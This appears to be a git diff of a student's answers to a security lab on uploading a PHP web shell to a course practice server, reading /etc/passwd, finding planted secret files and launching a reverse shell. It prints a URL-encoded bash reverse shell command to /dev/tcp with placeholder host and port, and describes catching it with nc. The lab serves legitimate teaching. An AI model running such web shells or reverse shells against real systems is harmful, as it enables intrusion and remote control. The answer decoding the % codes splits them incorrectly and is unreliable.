@@ -1,6 +1,6 @@
 David Toledo
 
-web shell
+---------------web shell
 Explain how you can execute the Linux command whoami on the server using your webshell. What result do you get when you execute that command?
 
   we can access the webshell I uploaded by going to: http://danger.jeffondich.com/uploadedimages/toledod-webshell1.php
@@ -12,11 +12,14 @@ Explain how you can execute the Linux command whoami on the server using your we
 What is this webshell's <pre> tag for? (And more to the point, what happens if you leave it out?)
   the <pre> tag keeps whatever is within it in that exact format (pre-formated text), including the white space / new lines in it. This also   effects how it is displayed, as the apparent change between the two comes from the font that the webshell gets displayed in.
 
-looking around:
+---------------looking around:
 
   What directory is danger's website located in?
   /var/www/
+
   What are the names of all the user accounts on danger.jeffondich.com? How do you know?
+  I am unsure of the exact users, but if all the people who upload an image count as users, we can view the contents of uploadedimages
+  using our webshell, and see who has uploaded imaages, counting them as users. As of right now there are 30 users.
 
 
 Do you have access to the file /etc/passwd? What's in it?
@@ -32,7 +35,7 @@ There may be some secret files scattered around. See how many you can find and r
   In secrets, there is a kindasecret.txt file which contains "Congratulations!" and an ASCII picture of a frog
   In youwontfindthiswithgobuster, there is a secret file that contains "Congratulations!" and an ASCII picture of birds
 
-Launching Reverse Shell:
+---------------Launching Reverse Shell:
 
 
 What is the IP address of your Kali VM (the target machine)? How did you find out?
@@ -50,4 +53,11 @@ What are all those % codes in the URL you used?
   http://KALI_IP/YOUR_WEBSHELL.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT%200%3E%261%22
   bash%20-c allows for bash to execute a command, and then putting bash%20-i%20% creates an interactive bash and 3E%26%20 redirects all of the standard out and errors into /dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT, which would send the results to our port, and 200%3E%261%22 redirects the output it recieves.
 Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.
+
+  upload webshell into kali
+  pick a port on hostOS and us nc to listen to a certain port
+  on a broswer, go to the url given, which connects to my webshell on the kali website.
+  the URL creates a bash command, which creates other interactive bash which the standard out of the bash into the /dev/tcp/myHost/port. 
+  By doing this, all out from the bash will be read by the nc on my host, and the last part will redirect any standard in back to the bash
+  Therefore, the bash can send things to my terminal via nc, and I can send things back to it.
 
